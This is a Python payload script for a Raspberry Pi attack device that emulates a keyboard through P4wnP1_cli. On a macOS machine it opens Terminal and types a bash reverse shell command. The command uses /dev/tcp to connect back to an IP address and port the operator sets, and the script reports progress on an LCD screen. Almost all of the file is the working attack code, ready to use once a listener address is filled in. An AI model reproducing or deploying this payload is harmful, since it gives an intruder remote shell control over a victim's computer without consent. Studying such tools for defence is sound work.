#!/usr/bin/env python3
"""
RaspyJack *payload* – **HID Attack: macOS Bash Reverse Shell**
================================================================
A HID attack that opens Terminal on macOS and executes a one-liner
to establish a bash reverse shell.

**NOTE:** You must change the IP address and port in the `revshell_command`
variable to your listener's details.
"""

import os, sys, subprocess, time
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

# --- CONFIGURATION ---
LISTENER_IP = "192.168.1.100"
LISTENER_PORT = "4444"

# --- Display Functions ---
def show_message(lines):
    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    image = Image.new("RGB", (128, 128), "BLACK")
    draw = ImageDraw.Draw(image)
    font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
    y = 40
    for line in lines:
        draw.text((10, y), line, font=font, fill="lime")
        y += 15
    LCD.LCD_ShowImage(image, 0, 0)

# --- Main Attack Logic ---
def run_attack():
    show_message(["HID Attack:", "macOS Revshell"])
    
    if subprocess.run("which P4wnP1_cli", shell=True, capture_output=True).returncode != 0:
        show_message(["ERROR:", "P4wnP1_cli", "not found!"])
        return

    # Bash Reverse Shell One-Liner
    revshell_command = f"bash -i >& /dev/tcp/{LISTENER_IP}/{LISTENER_PORT} 0>&1"
    
    # DuckyScript to open Terminal and execute the command
    script = f"""
GUI SPACE
delay(500)
type("Terminal")
delay(200)
press("ENTER")
delay(750)
type("{revshell_command}")
delay(200)
press("ENTER")
"""
    
    command = f"P4wnP1_cli hid job -c '{script}'"
    
    try:
        subprocess.run(command, shell=True, check=True, timeout=20)
        show_message(["Attack Sent!", "macOS Revshell"])
    except Exception as e:
        show_message(["Attack FAILED!"])
        print(f"Error running HID attack: {e}", file=sys.stderr)

# --- Execution ---
if __name__ == '__main__':
    try:
        run_attack()
        time.sleep(3)
    finally:
        LCD = LCD_1in44.LCD()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("HID Attack payload finished.")
